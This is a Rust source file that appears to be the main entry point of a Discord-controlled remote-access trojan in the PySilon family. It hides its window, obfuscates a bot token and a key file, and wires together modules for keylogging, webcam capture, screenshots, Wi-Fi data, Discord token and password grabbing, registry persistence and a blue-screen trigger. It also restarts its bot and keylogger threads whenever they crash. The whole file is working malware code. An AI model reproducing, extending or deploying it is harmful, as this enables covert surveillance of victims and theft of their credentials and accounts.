#![windows_subsystem= "windows"]
use std::{collections::HashMap, time::Duration};
use keylogger::KeyLogger;
use obfstr::*;
use discord_bot::DiscordBot;
use serde_json::{Value, json};
use once_cell::sync::Lazy;
use sysinfo::{System, SystemExt, RefreshKind, ProcessRefreshKind};
use tokio::sync::Mutex;
pub mod keylogger;
pub mod webcam;
pub mod wifi;
pub mod screenshot;
pub mod processes;
pub mod tree;
pub mod download;
pub mod upload;
pub mod bsod;
mod discord_token_grabber;
mod discord_bot;
mod registry;
mod password_grabber;
static BOT_TOKENS: Lazy<Mutex<Vec<String>>>= Lazy::new(|| Mutex::new(Vec::new()));
static SOFTWARE_REGISTRY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new("REGISTRY NAME GOES HERE".into()));
static SOFTWARE_DIRECTORY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new("DIRECTORY NAME GOES HERE".into()));
static SOFTWARE_EXECUTABLE_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new("EXECUTABLE NAME GOES HERE".into()));
static CHANNEL_IDS: Lazy<Mutex<HashMap<&str, Option<u64>>>>= Lazy::new(|| Mutex::new(HashMap::new()));
static SERVER_ID: Lazy<Mutex<u64>>= Lazy::new(|| Mutex::new(968675227494137936));
static CATEGORY_NAME: Lazy<Mutex<String>>= Lazy::new(|| Mutex::new(String::new()));
static BOT_TO_SEND: Lazy<Mutex<Vec<Value>>>= Lazy::new(|| Mutex::new(Vec::new()));
static MESSAGE_INTERACTION: Lazy<Mutex<HashMap<String, Value>>>= Lazy::new(|| Mutex::new(HashMap::new()));
static SYS: Lazy<Mutex<System>>= Lazy::new(|| Mutex::new(System::new_with_specifics(RefreshKind::new().with_processes(ProcessRefreshKind::everything()))));
static PROXIES: Lazy<Mutex<Vec<String>>>= Lazy::new(|| Mutex::new(Vec::new()));
static PROXY_ALL: Lazy<Mutex<bool>>= Lazy::new(|| Mutex::new(false));
static PYSILON_KEY: Lazy<Vec<u8>>= Lazy::new(|| obfbytes!(include_bytes!("key.pysilon")).to_vec());
#[tokio::main]
async fn main() {
    BOT_TOKENS.lock().await.push(obfstr!("TOKEN GOES HERE").to_string());
    let mut channel_ids= CHANNEL_IDS.lock().await;
    channel_ids.insert("info", None);
    channel_ids.insert("main", None);
    channel_ids.insert("spam", None);
    channel_ids.insert("file", None);
    channel_ids.insert("recordings", None);
    channel_ids.insert("voice", None);
    drop(channel_ids);
    registry::main().await;
    let mut discord_bot= tokio::spawn(async {DiscordBot::main().await});
    let mut keylogger= tokio::spawn(async {KeyLogger::main().await;});
    loop {
        if discord_bot.is_finished() {
            let result= discord_bot.await;
            match result {
                Ok(_) => {}
                Err(e) => {
                    if e.is_panic() {
						let panic= e.into_panic();
						let err= if let Some(s)= panic.downcast_ref::<String>() {
							s
						}else if let Some(s)= panic.downcast_ref::<&str>() {
							*s
						}else{
							"Unknown"
						};
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                            "embed": true,
                            "color": 0xff1412,
                            "title": "A Crash occurred",
                            "description": format!("```An error occurred on the Discord Bot Thread!\nError: {:?}```", err)
                        }));
                    }
                }
            }
            discord_bot= tokio::spawn(async {DiscordBot::main().await});
        }
        if keylogger.is_finished() {
            let result= keylogger.await;
            match result {
                Ok(_) => {}
                Err(e) => {
                    if e.is_panic() {
						let panic= e.into_panic();
						let err= if let Some(s)= panic.downcast_ref::<String>() {
							s
						}else if let Some(s)= panic.downcast_ref::<&str>() {
							*s
						}else{
							"Unknown"
						};
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                            "embed": true,
                            "color": 0xff1412,
                            "title": "A Crash occurred",
                            "description": format!("```An error occurred on the Key Logger Thread!\nError: {:?}```", err)
                        }));
                    }
                }
            }
            keylogger= tokio::spawn(async {KeyLogger::main().await});
        }
        tokio::time::sleep(Duration::from_secs_f64(1. / 10.)).await;
    }
}